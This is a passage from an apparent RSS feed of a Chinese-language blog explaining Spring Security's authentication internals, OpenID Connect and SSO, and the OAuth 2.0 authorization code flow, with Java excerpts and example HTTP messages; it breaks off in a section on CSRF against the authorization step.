&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">additionalAuthenticationChecks&lt;/span>&lt;span style="color:#f92672">(&lt;/span>UserDetails userDetails&lt;span style="color:#f92672">,&lt;/span>
UsernamePasswordAuthenticationToken authentication&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getCredentials&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Authentication failed: no credentials provided&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BadCredentialsException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AbstractUserDetailsAuthenticationProvider.badCredentials&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Bad credentials&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
String presentedPassword &lt;span style="color:#f92672">=&lt;/span> authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getCredentials&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>passwordEncoder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">matches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>presentedPassword&lt;span style="color:#f92672">,&lt;/span> userDetails&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPassword&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Authentication failed: password does not match stored value&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BadCredentialsException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AbstractUserDetailsAuthenticationProvider.badCredentials&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Bad credentials&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractuserdetailsauthenticationprovidercreatesuccessauthentication">AbstractUserDetailsAuthenticationProvider.createSuccessAuthentication()&lt;/h2>
&lt;p>认证成功后，调用 createSuccessAuthentication 方法，将 principal -&amp;gt; 用户身份，authentication -&amp;gt; 请求凭据，权限 -&amp;gt; user.getAuthorities() 组合成 Authentication 对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">protected&lt;/span> Authentication &lt;span style="color:#a6e22e">createSuccessAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object principal&lt;span style="color:#f92672">,&lt;/span>
Authentication authentication&lt;span style="color:#f92672">,&lt;/span> UserDetails user&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Ensure we return the original credentials the user supplied,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// so subsequent attempts are successful even with encoded passwords.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Also ensure we return the original getDetails(), so that future
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// authentication events after cache expiry contain the details
&lt;/span>&lt;span style="color:#75715e">&lt;/span> UsernamePasswordAuthenticationToken result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">(&lt;/span>
principal&lt;span style="color:#f92672">,&lt;/span> authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getCredentials&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>
authoritiesMapper&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">mapAuthorities&lt;/span>&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAuthorities&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
result&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setDetails&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDetails&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> result&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractauthenticationprocessingfiltersuccessfulauthentication">AbstractAuthenticationProcessingFilter.successfulAuthentication()&lt;/h2>
&lt;p>最后再回到 AbstractAuthenticationProcessingFilter 的 successfulAuthentication 方法。
由于将认证结果放入了 SecurityContextHolder.getContext().setAuthentication(authResult) 这个 ThreadLocal 对象，所以在每一个 requestScope 里你都可以通过 SecurityContextHolder.getContext 得到认证成功的 Authentication 对象，从而获取用户身份、请求凭据、与用户权限。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">successfulAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span>
HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span> FilterChain chain&lt;span style="color:#f92672">,&lt;/span> Authentication authResult&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Authentication success. Updating SecurityContextHolder to contain: &amp;#34;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> authResult&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">setAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authResult&lt;span style="color:#f92672">);&lt;/span>
rememberMeServices&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loginSuccess&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> authResult&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// Fire event
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">eventPublisher&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
eventPublisher&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">publishEvent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> InteractiveAuthenticationSuccessEvent&lt;span style="color:#f92672">(&lt;/span>
authResult&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
successHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">onAuthenticationSuccess&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> authResult&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractauthenticationprocessingfilter-unsuccessfulauthentication">AbstractAuthenticationProcessingFilter. unsuccessfulAuthentication()&lt;/h2>
&lt;p>当用户提交了非法的凭据时，DaoAuthenticationProvider 会抛出一个 BadCredentialsException 异常，这个异常是 AuthenticationException 异常的子类；
异常沿着调用链传递到 AbstractAuthenticationProcessingFilter 后会被捕获，捕获逻辑就定义在 unsuccessfulAuthentication 方法中。&lt;/p>
&lt;ul>
&lt;li>清空当前「用户空间」中的信息。&lt;/li>
&lt;li>通过 AuthenticationEntryPointFailureHandler. onAuthenticationFailure 方法将请求和异常指派到身份认证端点：authenticationEntryPoint.commence 方法中进行处理。&lt;/li>
&lt;li>spring security 提供了一系列的端点实现，根据项目需要你可以进行配置或者自定义任何你想要的认证端点处理逻辑。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">unsuccessfulAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span>
AuthenticationException failed&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">clearContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">failureHandler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">onAuthenticationFailure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> failed&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AuthenticationEntryPointFailureHandler&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AuthenticationFailureHandler &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> AuthenticationEntryPoint authenticationEntryPoint&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">AuthenticationEntryPointFailureHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>AuthenticationEntryPoint authenticationEntryPoint&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Assert&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">notNull&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authenticationEntryPoint&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;authenticationEntryPoint cannot be null&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticationEntryPoint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> authenticationEntryPoint&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onAuthenticationFailure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span>
AuthenticationException exception&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticationEntryPoint&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> exception&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="uml-diagram">UML Diagram&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/Xnip2021-04-19_12-18-22.jpg" alt="">&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>Spring security 首先由一系列 filter chians 构成。&lt;/li>
&lt;li>每种 security filter 负责不同的职责与功能。其中主要负责用户认证的 filter 为继承了 AbstractAuthenticationProcessingFilter 的 UsernamePasswordAuthenticationFilter。&lt;/li>
&lt;li>UsernamePasswordAuthenticationFilter 将用户认证委托给 ProviderManager 处理。&lt;/li>
&lt;li>ProviderManager 负责将认证处理委托给一系列 Provider。其中 DaoAuthenticationProvider 专门处理针对 UsernamePasswordAuthenticationToken 的认证处理。&lt;/li>
&lt;li>使用加密工具 PasswordEncoder ，匹配从数据库中查询出指定的用户的密码与用户请求凭据中的密码，完成认证逻辑。&lt;/li>
&lt;li>处理完成后，认证对象会放入 requestScope 中方便后续取用。&lt;/li>
&lt;/ol></description></item><item><title>SSO、OAuth2、与 OpenID connect</title><link>https://www.chucklin.net/post/oidc/</link><pubDate>Tue, 24 Nov 2020 10:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/oidc/</guid><description>&lt;h2 id="授权与认证">授权与认证&lt;/h2>
&lt;p>上一章我们一直在反复阐述一个事实： OAuth2 协议是用来解决用户对软件授权的。为何要如此强调这个事实呢？因为授权、认证、单点登录非常容易被混淆。
用户认证是指证明自己的身份。认证有时候会和授权一起使用，就像你去酒店必须首先用身份证证明你的身份，酒店才会授予你使用酒店服务的权利一样。&lt;/p>
&lt;h2 id="oauth2-与-oidc">OAuth2 与 OIDC&lt;/h2>
&lt;p>今天要介绍的是 OpenID connect 简称 OIDC 是一个关于第三方用户认证的标准化协议。这个协议是建立在我们之前介绍的 OAuth2.0 的基础上的。这又是一个容易混淆的地方：虽然授权和认证在语义上明显不同，但是他们却使用类似的协议来解决问题。还记得之前我们谈到过 OAuth2.0 是一个授权协议，但是他的功能不仅仅如此。OAuth 可以被用来解决任何问题，身份认证就是其中一种。
于是，基于 OAuth 2.0 的协议流程，第三方用户认证协议 OpenID connect 就被设计出来了。所以 OIDC 是 OAuth2.0 的超集，但是认证并不是授权的超集。&lt;/p>
&lt;h2 id="oidc-授权码许可类型流程简介">OIDC 授权码许可类型流程简介&lt;/h2>
&lt;p>是的，OIDC 也有两种常用类型：授权码许可类型与隐式许可类型。由于 OIDC 在 OAuth2.0 的基础上被设计出来，所以 OAuth2.0 的流程基本上就是 OIDC 的流程。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/2020-11-24-17-51-45.png" alt="">&lt;/p>
&lt;p>在 OIDC 的流程中，相对 OAuth2.0 有 3 个变化。&lt;/p>
&lt;ol>
&lt;li>授权服务器 + 资源服务器 = 认证服务器。&lt;/li>
&lt;li>根据授权码获取的 token 中包含 id_token。&lt;/li>
&lt;li>用户详情可以使用 UserInfo 端点获取。
认证服务器的变化很容易理解，由于身份认证不需要使用特定资源只需要对身份认证，所以整合了授权服务器和资源服务器合并为认证服务器。
但是单独设计 id_token 的理由是什么呢？在授权的场景中，access_token 在协议中是对客户端透明的，不需要被解析。而身份认证需要告诉客户端用户的具体身份；另外 access_token 的用处是访问受保护资源，这是属于授权的概念而不是属于身份认证的概念；最后授权的有效时间和身份认证的有效时间很可能不一样，所以单独设计了 id_token。&lt;/li>
&lt;/ol>
&lt;p>id_token 是一个内容基于 jwt 格式的身份令牌（结构如下）。客户端通过解析这个令牌获取用户的登录认证数据以后，就可以为用户提供基于认证中心的第三方登录功能了。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/jwtoidc.png" alt="">&lt;/p>
&lt;p>当然偶尔这个 jwt 的有效载荷会更加充实一点：&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;quot;iss&amp;quot;: &amp;quot;http://server.example.com&amp;quot;,
&amp;quot;sub&amp;quot;: &amp;quot;248289761001&amp;quot;,
&amp;quot;aud&amp;quot;: &amp;quot;s6BhdRkqt3&amp;quot;,
&amp;quot;nonce&amp;quot;: &amp;quot;n-0S6_WzA2Mj&amp;quot;,
&amp;quot;exp&amp;quot;: 1311281970,
&amp;quot;iat&amp;quot;: 1311280970,
&amp;quot;name&amp;quot;: &amp;quot;Jane Doe&amp;quot;,
&amp;quot;given_name&amp;quot;: &amp;quot;Jane&amp;quot;,
&amp;quot;family_name&amp;quot;: &amp;quot;Doe&amp;quot;,
&amp;quot;gender&amp;quot;: &amp;quot;female&amp;quot;,
&amp;quot;birthdate&amp;quot;: &amp;quot;0000-10-31&amp;quot;,
&amp;quot;email&amp;quot;: &amp;quot;janedoe@example.com&amp;quot;,
&amp;quot;picture&amp;quot;: &amp;quot;http://example.com/janedoe/me.jpg&amp;quot;
}
&lt;/code>&lt;/pre>&lt;p>至于 UserInfo 端点，由于 jwt 格式的 id_token 并不包含过多的用户业务信息，而在用户体验上客户端又需要向用户展示头像、昵称等内容，所以 OIDC 定义了客户端可以使用 access_token 访问 UserInfo 端点获取用户详情的标准化接口。&lt;/p>
&lt;pre tabindex="0">&lt;code>HTTP/1.1 200 OK
Content-Type: application/json
{
&amp;quot;sub&amp;quot;: &amp;quot;ChuckLin@hotmail.com&amp;quot;,
&amp;quot;name&amp;quot;: &amp;quot;Chuck Lin&amp;quot;,
&amp;quot;given_name&amp;quot;: &amp;quot;Chuck&amp;quot;,
&amp;quot;family_name&amp;quot;: &amp;quot;Lin&amp;quot;,
&amp;quot;preferred_username&amp;quot;: &amp;quot;ChuckLin2020@hotmail.com&amp;quot;,
&amp;quot;email&amp;quot;: &amp;quot;mikumiku.lch@hotmail.com&amp;quot;
}
&lt;/code>&lt;/pre>&lt;p>同时这也是 access_token 用于访问受保护资源，id_token 用于身份认证的一次结合应用。
说了这么多，那学习 OIDC 有什么用呢？ OIDC 的其中一个用处就是可以用来构建一个单点登录系统（SSO）。&lt;/p>
&lt;h2 id="一个标准化的-sso-场境">一个标准化的 SSO 场境&lt;/h2>
&lt;p>假设企业为了自身的运营需要分别部署了 2 个系统：「A、B」。两个系统上线时间不同，提供的业务服务不同，用户体系与认证逻辑不同。所以这两个系统是完全「互不相通」的。
现在需要在不影响现有系统逻辑的前提条件下，提供「一次登陆、多端有效」的功能。&lt;/p>
&lt;p>经过构思，我们决定构建统一登陆中心；接着让两个系统都认可统一登陆中心的认证结果，来达到「最小化改动」现有系统的前提下实现 SSO 的功能。回顾上面的知识，OIDC 协议中的身份认证服务器就可以满足这一要求。&lt;/p>
&lt;p>&lt;img src="https://www.chucklin.net/images/sso.png" alt="sso">&lt;/p>
&lt;h1 id="heading">&lt;/h1>
&lt;h2 id="sso-单点登录系统">SSO 单点登录系统&lt;/h2>
&lt;p>注意这也是一个容易搞错的知识点：没有任何规定要求必须使用 OIDC 来构建 SSO。实际上你完全可以不使用 OIDC，或是使用 OIDC 的隐式许可类型流程来构建一个 SSO，这都完全取决于你的选择，况且互联网上运行的大部分 SSO 都并没有严格遵守 OIDC 规范。&lt;/p></description></item><item><title>OAuth 2.0 简述</title><link>https://www.chucklin.net/post/oauth2/</link><pubDate>Tue, 24 Nov 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/oauth2/</guid><description>&lt;h2 id="什么是授权">什么是授权&lt;/h2>
&lt;p>生活中有很多授权的场景，比如：假设你有一辆车，你现在指派一名代驾司机来帮你把车开回家，这就是一种授权。因为你授予了代驾司机使用你的小汽车的权利。在软件领域，授权通常指用户对某软件授予访问受保护资源权限的行为。OAuth2 就是为了将这种行为标准化所设计出来的协议。&lt;/p>
&lt;h2 id="oauth-不是什么">OAuth 不是什么&lt;/h2>
&lt;p>从上面的内容可以了解到：OAuth 是用户对软件行为授权的协议。用户除了对软件授权以外，当然也可以对用户授权——比如我授权 cherry 全权操作我的基金账户。OAuth 2 当然能够解决这样的问题（请查阅基于 OAuth 衍生出的 UMA 协议相关资料），但是需要记住这不是 OAuth 设计的初衷。
再比如，现在有不少系统利用 OAuth 来构建统一登陆中心（SSO），他们错了吗？当然没有。用 OAuth 解决「认证」的问题也是小菜一碟。但是就像刚才说过的， OAuth 本质上只是一个授权协议。&lt;/p>
&lt;h2 id="什么是令牌">什么是令牌&lt;/h2>
&lt;p>接上例。显而易见，代驾司机需要车钥匙才能帮你将车开回家。当然你可以将车钥匙交给代驾司机，但是显然让代驾司机使用专用的「泊车钥匙」显然更加安全。在软件领域，你的账号密码就相当于车钥匙，令牌则类似泊车钥匙。当然，并不是所有企业都拥有泊车钥匙。但是拥有泊车钥匙的汽车通常都意味着更好的品牌、更高的售价、以及更棒的质量。&lt;/p>
&lt;h2 id="授权码许可类型的协议流程">授权码许可类型的协议流程&lt;/h2>
&lt;p>OAuth 协议的特点是，只定义交互流程但不对流程中的接口交互参数等细节做过多限制。这句话有点难以理解，但是以后你会懂。
下面用一张图来展示 「授权码许可类型」 的授权流程。等等，既然有「授权码许可类型」那还有没有其他类型？当然有，比如后面会提到的「隐式许可类型」。不过我们现在先来看看授权码许可类型吧。
&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/2020-11-24-17-51-45.png" alt="">&lt;/p>
&lt;ul>
&lt;li>由于授权服务器需要提前准备客户端元数据（先不要问为什么），所以使用 OAuth 的第一步是将客户端注册到授权服务器中。&lt;/li>
&lt;li>浏览器请求客户端（照片打印服务）打印谷歌照片中存储的用户隐私照片。很显然，谷歌照片服务中的数据不允许客户端随意访问，这时候就需要找谷歌授权服务器对客户端进行授权，这一步是客户通过 302 重定向来实现的。以下示例中的 state 是一串随机生成的参数，就像随机生成一串订单号一样。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>HTTP/1.1 302 Moved Temp
Location: http://google.auth.com/authorize?response_type=code&amp;amp;scope=foo&amp;amp;client_id=mrpicture&amp;amp;redirect_url=http://mrpicture.com/callback&amp;amp;state=Lwt50024XyzHW1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>上一步通过 302 使浏览器向授权服务器发送了一个 Http 请求。因为我们在第 0 步提前进行了合法客户端的元数据配置，所以这里可以通过校验 client_id 与 redirect_url 来过滤无效和伪造的客户端请求。接着授权服务器会渲染授权页面要求用户登录并授权对应权限给客户端。&lt;/li>
&lt;li>当用户授权完毕后，授权服务器保存权限范围（scope）并创建授权码。由于授权是用户浏览器直接和授权服务器进行的，所以需要使用 302 + redirect_url 回调客户端并告知用户授权成功并回传授权码与 state 参数。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>HTTP 302 Found
Location: http://mrpicture.com/callback&amp;amp;state=Lwt50024XyzHW1&amp;amp;code=8V1qosiJswxv&amp;amp;response_type=code&amp;amp;scope=foo&amp;amp;client_id=mrpicture
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>客户端收到回调后，验证 state 等参数是否与自己前面步骤发送的参数一致，这可以防止攻击者随意编造请求访问客户端回调地址引发后续流程，浪费客户端和授权服务器资源。然后使用 HTTP 基本认证，将在元数据注册步骤中获取到的 client_id 与 client_secret 与授权码一起发送到授权服务器，获取访问 token。最后记得不要忘了 grant_type 字段。授权码许可类型的 grant_type 总是固定为 authorization_code。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>POST /token
Host: http://google.auth.com/
Content-type: application/x-www-form-encoded
Authorization: Basic b2F1dGgt2xpZW50LTE6BeFFJIWxxyliit220xCssXPsiwn5Bcod2a（base64(urlEncode(account+&amp;quot;:&amp;quot;+password))）
grant_type=authorization_code&amp;amp;redirect_uri=http://mrpicture.com/callback&amp;amp;code=8V1qosiJswxv
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>为什么这里还要发送 redirect_url 呢？根据 OAuth 规范，如果你在授权请求重定向中指定了 URI，那你在令牌请求中也必须指定。如果一切顺利的话，客户端就可以获得一个 Bearer 令牌。Bearer 令牌中还可以包含刷新令牌和令牌的权限范围以及过期时间等等。&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>&amp;quot;access_token&amp;quot;: &amp;quot;2983Exodengdisowagds2q2345dfsoiwg&amp;quot;,
&amp;quot;token_type&amp;quot;: &amp;quot;Baerer&amp;quot;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>既然获取到了令牌，客户端就可以使用令牌请求相关资源并返回到浏览器，或者保存令牌在客户端供今后使用。&lt;/li>
&lt;/ul>
&lt;h2 id="再稍微深入一点">再稍微深入一点&lt;/h2>
&lt;p>之前我们讲到过，OAuth 2.0 协议的特点是定义交互流程但不对交互细节作过多限制。所以想要设计一个健壮的 OAuth2.0 协议光理解上面的流程图是不够的。如果你还没有丧失兴趣，建议继续往下阅读。&lt;/p>
&lt;h3 id="前端信道和后端信道">前端信道和后端信道&lt;/h3>
&lt;p>由于授权一定伴随到第三方网站上登陆的动作，若将登录后的 token 直接通过浏览器 url 返回是非常不安全的行为。另外 url 长度有限也不适合放入复杂的 token 信息。所以，通过首先发放授权码，其次请求客户端通过授权码在后端换取 token 是更安全的做法。
回到协议流程图中的第 2 步和第 4 步。在这一步用户通过浏览器重定向和授权服务器建立了授权链接并通过浏览器回调发放了临时授权码，通常我们将这种流程称之为前端授权信道，简称「前端信道」。在第 5 步客户端收到了授权服务器的回调，并将自身的凭据和授权码一并发送到授权服务器获取 access_token，这通常被称为后端令牌信道，简称「后端信道」。
一个完整的授权码协议流程，一定包含一个前端信道和一个后端信道，不然就不是标准的授权码协议流程。&lt;/p>
&lt;h3 id="针对用户的-csrf-攻击">针对用户的 CSRF 攻击&lt;/h3>
&lt;p>接着上一小节来分析第 2 步。用户和授权服务器通过前端信道建立连接后，服务器会渲染或者 foward 一个授权页面给到用户，这看起来好像没什么问题。但是使用 &lt;a href="https://www.chucklin.net/post/csrf/">CSRF&lt;/a>，攻击者可以很容易的使用户反复授权浪费服务器资源（反复发送无效授权请求），或者在某些糟糕的授权 API 设计上将用户资源授权到攻击者客户端。
&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/2020-11-24-13-20-51.png" alt="">
